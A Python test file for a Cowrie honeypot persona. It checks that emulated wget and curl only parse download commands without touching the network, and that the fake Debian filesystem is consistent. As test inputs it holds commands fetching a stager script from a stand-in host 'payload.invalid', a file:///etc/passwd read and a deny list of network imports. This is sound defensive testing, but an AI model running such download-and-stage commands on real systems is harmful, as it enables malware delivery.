from __future__ import annotations

import importlib.util
import sys
import types
from pathlib import Path

ROOT = Path(__file__).parents[1]
PERSONA = ROOT / "deploy" / "cowrie-persona"
SAFE_TRANSFER = PERSONA / "commands" / "safe_transfer.py"


def _load_safe_transfer():
    class HoneyPotCommand:
        pass

    class PermissionDenied(Exception):
        pass

    cowrie = types.ModuleType("cowrie")
    shell = types.ModuleType("cowrie.shell")
    command = types.ModuleType("cowrie.shell.command")
    fs = types.ModuleType("cowrie.shell.fs")
    command.HoneyPotCommand = HoneyPotCommand
    fs.PermissionDenied = PermissionDenied

    previous = {
        name: sys.modules.get(name)
        for name in ("cowrie", "cowrie.shell", "cowrie.shell.command", "cowrie.shell.fs")
    }
    sys.modules.update(
        {
            "cowrie": cowrie,
            "cowrie.shell": shell,
            "cowrie.shell.command": command,
            "cowrie.shell.fs": fs,
        }
    )
    try:
        spec = importlib.util.spec_from_file_location("persona_safe_transfer", SAFE_TRANSFER)
        assert spec and spec.loader
        module = importlib.util.module_from_spec(spec)
        sys.modules[spec.name] = module
        spec.loader.exec_module(module)
        return module
    finally:
        sys.modules.pop("persona_safe_transfer", None)
        for name, value in previous.items():
            if value is None:
                sys.modules.pop(name, None)
            else:
                sys.modules[name] = value


def test_wget_and_curl_intent_is_parsed_without_contacting_network() -> None:
    module = _load_safe_transfer()

    wget = module.parse_wget(
        ["-q", "-O", "/tmp/stage.sh", "https://payload.invalid/stage.sh"]
    )
    curl = module.parse_curl(
        ["-fsSL", "https://payload.invalid/stage.sh", "-o", "/tmp/stage.sh"]
    )

    assert wget == module.TransferIntent(
        url="https://payload.invalid/stage.sh", output="/tmp/stage.sh", quiet=True
    )
    assert curl == module.TransferIntent(
        url="https://payload.invalid/stage.sh", output="/tmp/stage.sh", quiet=True
    )


def test_transfer_emulator_rejects_non_network_and_malformed_urls() -> None:
    module = _load_safe_transfer()

    assert module.parse_wget(["file:///etc/passwd"]) is None
    assert module.parse_curl(["https://[broken.invalid/payload"]) is None


def test_transfer_emulator_contains_no_network_client_imports() -> None:
    source = SAFE_TRANSFER.read_text(encoding="utf-8").lower()

    for forbidden in (
        "import socket",
        "import treq",
        "import requests",
        "urllib.request",
        "import httpx",
        "open_connection",
    ):
        assert forbidden not in source
    assert b"#!/bin/sh\nexit 0\n" == (PERSONA / "safe-placeholder.sh").read_bytes()


def test_safe_transfer_override_is_loaded_last_and_only_replaces_transfer_tools() -> None:
    registry = (PERSONA / "commands" / "__init__.py").read_text(encoding="utf-8")

    assert registry.rfind('"safe_transfer"') > registry.rfind('"wget"')
    module = _load_safe_transfer()
    assert set(module.commands) == {
        "/usr/bin/wget",
        "wget",
        "/usr/bin/dget",
        "dget",
        "/usr/bin/curl",
        "curl",
    }


def test_debian_persona_is_internally_consistent() -> None:
    honeyfs = PERSONA / "honeyfs"

    assert (honeyfs / "etc" / "hostname").read_text(encoding="utf-8").strip() == (
        "app-prod-01"
    )
    os_release = (honeyfs / "etc" / "os-release").read_text(encoding="utf-8")
    version = (honeyfs / "proc" / "version").read_text(encoding="utf-8")
    assert 'VERSION_ID="12"' in os_release
    assert "Debian" in version
    assert "6.1.0-21-amd64" in version
    assert "phil" not in (honeyfs / "etc" / "passwd").read_text(encoding="utf-8")
